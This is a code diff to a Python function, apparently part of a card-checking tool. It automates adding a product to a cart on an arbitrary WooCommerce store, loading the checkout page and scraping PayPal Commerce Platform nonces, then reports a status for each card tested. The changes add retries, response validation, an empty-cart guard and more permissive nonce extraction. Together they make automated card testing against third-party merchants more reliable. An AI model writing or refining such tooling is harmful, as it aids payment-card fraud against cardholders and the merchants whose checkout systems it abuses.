@@ -154,38 +154,51 @@ def check_ppcp(session: requests.Session, domain: str, card_tuple: tuple, **kwar
             "card":    card_str,
         }
 
-    # ── 2. Add to cart ────────────────────────────────────────────────────────────
-    try:
-        session.post(
-            f"https://{domain}/?wc-ajax=add_to_cart",
-            data={"product_id": product_id, "quantity": "1"},
-            headers={
-                "User-Agent":        ua,
-                "Accept":            "application/json, text/javascript, */*; q=0.01",
-                "Content-Type":      "application/x-www-form-urlencoded; charset=UTF-8",
-                "X-Requested-With":  "XMLHttpRequest",
-            },
-            timeout=REQUEST_TIMEOUT,
-        )
-    except Exception as exc:
-        return {"status": "unknown", "message": f"ATC error: {exc}", "amount": "", "card": card_str}
+    # ── 2. Add to cart (up to 3 attempts, validate response) ─────────────────────
+    atc_ok = False
+    for _attempt in range(3):
+        try:
+            atc_resp = session.post(
+                f"https://{domain}/?wc-ajax=add_to_cart",
+                data={"product_id": product_id, "quantity": "1"},
+                headers={
+                    "User-Agent":        ua,
+                    "Accept":            "application/json, text/javascript, */*; q=0.01",
+                    "Content-Type":      "application/x-www-form-urlencoded; charset=UTF-8",
+                    "X-Requested-With":  "XMLHttpRequest",
+                },
+                timeout=REQUEST_TIMEOUT,
+            )
+            # WooCommerce returns {"fragments":{...}} on success; {"error":true} on failure
+            if atc_resp.status_code == 200 and '"error":true' not in atc_resp.text and "fragments" in atc_resp.text:
+                atc_ok = True
+                break
+        except Exception as exc:
+            return {"status": "unknown", "message": f"ATC error: {exc}", "amount": "", "card": card_str}
+
+    if not atc_ok:
+        return {"status": "unknown", "message": "Add to cart failed", "amount": "", "card": card_str}
 
     # ── 3. Load checkout page ─────────────────────────────────────────────────────────────
     try:
-        r              = session.get(
+        r             = session.get(
             f"https://{domain}/checkout/",
             headers={"User-Agent": ua, "Upgrade-Insecure-Requests": "1"},
             timeout=REQUEST_TIMEOUT,
         )
-        checkout_html  = r.text
+        checkout_html = r.text
     except Exception as exc:
         return {"status": "unknown", "message": f"Checkout load: {exc}", "amount": "", "card": card_str}
 
-    # Extract nonces
-    m = re.search(r'"create_order":\{"endpoint":"[^"]*","nonce":"([^"]+)"', checkout_html)
+    # Guard: if checkout redirected back to cart (empty cart), bail early
+    if "woocommerce-process-checkout-nonce" not in checkout_html:
+        return {"status": "unknown", "message": "Cart empty / checkout redirect", "amount": "", "card": card_str}
+
+    # Extract nonces — allow any key order and optional whitespace (handles minified + pretty JSON)
+    m = re.search(r'"create_order"\s*:\s*\{[^}]*?"nonce"\s*:\s*"([^"]+)"', checkout_html, re.DOTALL)
     create_order_nonce  = m.group(1) if m else ""
 
-    m = re.search(r'"approve_order":\{"endpoint":"[^"]*","nonce":"([^"]+)"', checkout_html)
+    m = re.search(r'"approve_order"\s*:\s*\{[^}]*?"nonce"\s*:\s*"([^"]+)"', checkout_html, re.DOTALL)
     approve_order_nonce = m.group(1) if m else ""
 
     m = re.search(r'"data_client_id"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"', checkout_html, re.DOTALL)
@@ -202,7 +215,7 @@ def check_ppcp(session: requests.Session, domain: str, card_tuple: tuple, **kwar
     if not create_order_nonce:
         return {
             "status":  "unknown",
-            "message": "PPCP nonces not found — not a PPCP store?",
+            "message": "PPCP nonces not found — plugin missing or different PPCP config",
             "amount":  amount,
             "card":    card_str,
         }
